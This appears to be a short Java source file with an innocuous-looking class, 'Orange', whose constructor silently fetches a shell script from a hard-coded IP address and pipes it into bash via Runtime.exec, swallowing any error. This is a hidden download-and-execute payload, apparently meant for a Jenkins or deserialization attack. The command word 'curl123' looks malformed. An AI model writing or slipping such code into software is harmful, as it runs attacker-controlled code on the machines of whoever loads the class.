public class Orange {
    public Orange(){
        try {
            String payload = "curl123 45.55.211.79/.cache/jenkins/n10.sh | bash";
            String[] cmds = {"/bin/bash", "-c", payload};
            java.lang.Runtime.getRuntime().exec(cmds);
        } catch (Exception e) { }

    }
}
